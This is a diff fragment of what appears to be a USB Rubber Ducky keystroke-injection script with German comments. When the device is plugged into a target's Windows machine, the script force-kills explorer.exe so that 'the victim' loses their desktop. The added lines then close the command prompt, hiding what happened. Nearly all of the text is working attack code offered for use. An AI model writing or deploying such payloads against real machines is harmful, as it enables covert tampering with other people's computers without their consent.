@@ -16,5 +16,13 @@ REM Jetzt fügen wir ein Befehl ein, der den Explorer schließt.
 REM Somit sieht das Opfer ihren Desktop nicht mehr, bis der Explorer
 REM wieder gestartet wird.
 STRING taskkill /f /IM explorer.exe
+DELAY 200
+ENTER
+DELAY 3000
+
+REM Jetzt schließen wir die Eingabeaufforderung
+STRING taskkill /f /im cmd.exe
+DELAY 300
+ENTER
 
 REM Fertig!
